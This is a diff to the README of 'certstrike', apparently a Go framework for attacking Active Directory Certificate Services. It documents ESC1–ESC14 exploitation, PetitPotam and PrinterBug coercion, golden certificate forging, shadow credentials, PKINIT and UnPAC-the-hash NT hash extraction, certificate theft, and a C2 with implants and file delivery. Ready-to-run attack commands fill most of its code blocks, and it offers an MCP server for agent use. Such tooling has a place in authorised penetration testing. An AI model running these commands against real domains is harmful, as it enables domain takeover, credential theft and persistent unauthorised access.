@@ -10,9 +10,9 @@ ADCS exploitation and PKI attack framework with integrated cert-auth C2. Pure Go
 - **NTLM pass-the-hash** for both LDAP and HTTP enrollment (`--hash` flag)
 - **ESC1** Misconfigured templates (enrollee supplies subject + auth EKU)
 - **ESC2** Any Purpose EKU templates (enrollee supplies subject)
-- **ESC3** Enrollment Agent templates (two-stage: agent cert → enroll on behalf)
+- **ESC3** Enrollment Agent templates (two-stage CMC co-signed enrollment via RPC)
 - **ESC4** Vulnerable template ACLs — full binary ACE parsing, WriteDACL/WriteOwner, LDAP modify + auto-restore
-- **ESC5** Vulnerable PKI object ACLs on CA
+- **ESC5** Vulnerable PKI object ACLs on CA (detection — chains to ESC7 for exploitation)
 - **ESC6** EDITF_ATTRIBUTESUBJECTALTNAME2 — SAN injection via CA enrollment service flags
 - **ESC7** Vulnerable CA ACLs — ManageCA → enable ESC6 → enroll → auto-restore
 - **ESC8** HTTP web enrollment relay detection + PetitPotam auto-coercion
@@ -24,17 +24,22 @@ ADCS exploitation and PKI attack framework with integrated cert-auth C2. Pure Go
 - **ESC14** Weak explicit mappings via altSecurityIdentities
 - **Golden certificate forging** — self-signed or sign with extracted CA key
 - **Shadow Credentials** — msDS-KeyCredentialLink add/list/remove (key persisted before LDAP write)
-- **Auto-pwn** — enumerate → prioritize → exploit → PKINIT commands in one shot
-- **PetitPotam coercion** — MS-EFSRPC via stateful SMB2/DCE/RPC session
+- **PKINIT authentication** — RFC 4556 DH key exchange, CMS SignedData, AS-REQ to KDC, ccache output
+- **UnPAC-the-hash** — U2U TGS-REQ, PAC_CREDENTIAL_INFO decryption, NT hash extraction
+- **Auto-pwn** — enumerate → prioritize → exploit → PKINIT → UnPAC → NT hash in one shot
+- **PetitPotam coercion** — MS-EFSRPC via stateful SMB2/DCE/RPC session (unauthenticated)
+- **PrinterBug coercion** — MS-RPRN via authenticated SMB2/DCE/RPC (RpcOpenPrinterEx + callback)
 - **WebDAV coercion** — relay from non-admin pivot using custom port >1024
+- **Certificate theft** — THEFT4 automated via LDAP userCertificate extraction; THEFT1-3,5 playbooks
 
 ### C2 Framework
 - HTTP/HTTPS listeners with auto-generated TLS certificates
 - Session management: registration, polling, command queue, result collection
-- **Certificate persistence**: cert-auth implants via forged certificates (Schannel mTLS)
+- **Certificate persistence**: cert-auth implants via forged certificates (Schannel mTLS with server-side verification)
 - **Polling agent**: cross-platform, mTLS support, signal-aware shutdown
 - **File delivery**: upload and deploy binaries to agents with optional execution
 - Agent command output capped at 10MB (OOM prevention)
+- **Operator API**: GET /api/sessions, POST /api/command, GET /api/results, POST /api/deploy, GET /health
 
 ### SmartPotato — Windows Privilege Escalation
 - **JuicyPotato** — BITS COM object abuse + named pipe impersonation
@@ -51,7 +56,7 @@ ADCS exploitation and PKI attack framework with integrated cert-auth C2. Pure Go
 - **LDAPS/StartTLS** — encrypted LDAP connections via `--ldaps` / `--start-tls`
 - **MCP server** — 5 tools for agentic integration (pki_enumerate, pki_forge, c2_*)
 - **TUI operator console** — live C2 session polling, command dispatch, 5 views
-- **Certificate theft playbook** — THEFT1-THEFT5 with certutil/mimikatz/SharpDPAPI commands
+- **Certificate theft** — THEFT4 automated via LDAP; THEFT1-3,5 playbooks with certutil/mimikatz/SharpDPAPI
 
 ## Quick Start
 
@@ -103,7 +108,7 @@ certstrike pki --esc 6 --template AnyTemplate --upn admin@corp.local \
 certstrike pki --esc 7 --ca CorpCA --upn admin@corp.local \
   --target-dc dc01.corp.local --domain corp.local -u user -p pass
 
-# ESC8 — NTLM relay with auto PetitPotam coercion
+# ESC8 — NTLM relay with auto PetitPotam/PrinterBug coercion
 certstrike pki --esc 8 --template Machine --target-dc dc01.corp.local \
   --domain corp.local -u user -p pass --listener-ip 10.0.0.5
 
@@ -124,11 +129,17 @@ certstrike pki --esc 13 --template LinkedPolicy --upn admin@corp.local \
 ### Auto-Pwn
 
 ```bash
-# Full auto: enumerate → exploit highest-scoring path → PKINIT commands
+# Full auto: enumerate → exploit → PKINIT → UnPAC-the-hash → NT hash
 certstrike auto --target-dc dc01.corp.local --domain corp.local --upn admin@corp.local -u user -p pass
+
+# With LDAPS and stealth mode
+certstrike auto --target-dc dc01.corp.local --domain corp.local --upn admin@corp.local -u user -p pass --ldaps --stealth
 
 # Dry run: enumerate and plan only, don't exploit
 certstrike auto --dry-run --target-dc dc01.corp.local --domain corp.local --upn admin@corp.local -u user -p pass
+
+# Interactive: choose which ESC path(s) to attempt
+certstrike auto -i --target-dc dc01.corp.local --domain corp.local --upn admin@corp.local -u user -p pass
 ```
 
 ### Certificate Operations
@@ -146,7 +157,9 @@ certstrike pki --import-pfx cert.pfx --json
 
 # Certificate theft playbook (--theft accepts 1-5 or all)
 certstrike pki --theft all
-certstrike pki --theft 4
+
+# THEFT4 — automated LDAP userCertificate extraction
+certstrike pki --theft 4 --target-dc dc01.corp.local --domain corp.local -u user -p pass
 
 # Generate engagement report
 certstrike pki --report --format markdown --output findings.md \
@@ -156,17 +169,21 @@ certstrike pki --report --format markdown --output findings.md \
 ### Shadow Credentials
 
 ```bash
-# Add shadow credential (private key saved to disk before LDAP write)
-certstrike shadow --add --target "CN=victim,CN=Users,DC=corp,DC=local" \
+# Add shadow credential (accepts sAMAccountName — auto-resolves DN via LDAP)
+certstrike shadow --add --target victim \
   --target-dc dc01.corp.local --domain corp.local -u user -p pass
 
+# With LDAPS
+certstrike shadow --add --target victim \
+  --target-dc dc01.corp.local --domain corp.local -u user -p pass --ldaps
+
 # List shadow credentials
-certstrike shadow --list --target "CN=victim,CN=Users,DC=corp,DC=local" \
+certstrike shadow --list --target victim \
   --target-dc dc01.corp.local --domain corp.local -u user -p pass
 
 # Remove by device ID
-certstrike shadow --remove --target "CN=victim,CN=Users,DC=corp,DC=local" \
-  --device-id <guid> --target-dc dc01.corp.local --domain corp.local -u user -p pass
+certstrike shadow --remove --target victim --device-id <guid> \
+  --target-dc dc01.corp.local --domain corp.local -u user -p pass
 ```
 
 ### C2
@@ -209,18 +226,20 @@ cmd/certstrike/         CLI entry points (cobra)
   mcp_cmd.go            MCP stdio server
 pkg/pki/
   adcs.go               LDAP enumeration, template scoring, ESC1/ESC4 exploits, cert forging
-  enroll.go             Real certificate enrollment via CA web endpoint (/certsrv/)
+  enroll.go             Certificate enrollment via CA web endpoint (/certsrv/) + CMC on-behalf-of
+  rpc_enroll.go         Certificate enrollment via ICertPassage DCE/RPC over SMB2 named pipe
   ntlm.go               NTLMv2 HTTP RoundTripper with pass-the-hash (inline MD4)
-  coerce.go             PetitPotam MS-EFSRPC coercion (stateful SMB2/DCE/RPC)
+  coerce.go             PetitPotam (MS-EFSRPC) + PrinterBug (MS-RPRN) coercion via SMB2/DCE/RPC
   esc2.go - esc14.go    Individual ESC scan + exploit functions
   esc_relay.go          ESC8/ESC11/ESC12 relay scanning (HTTP probe, RPC flag check, DCOM probe)
   shadow_credentials.go msDS-KeyCredentialLink operations
   autopwn.go            Auto-pwn engine (enumerate → prioritize → exploit)
   report.go             Markdown engagement report generation
   chain.go              Attack path analysis and prioritization
-  pkinit.go             PKINIT command/script generation
-  unpac.go              UnPAC-the-hash command generation
-  certtheft.go          THEFT1-THEFT5 playbook
+  pkinit.go             RFC 4556 PKINIT authentication (DH, CMS, AS-REQ/REP, ccache)
+  unpac.go              UnPAC-the-hash (U2U TGS-REQ, PAC decryption, NT hash extraction)
+  certtheft.go          THEFT4 LDAP extraction + THEFT1-3,5 playbooks
+  kerberos.go           Kerberos client (ccache, keytab, SPNEGO, GSSAPI bind)
   security_descriptor.go Binary SD/ACE/SID parsing for ESC4/ESC5
   output.go             EnumerationResult struct, EnumerateAll aggregator
   pfx.go                PFX import/export
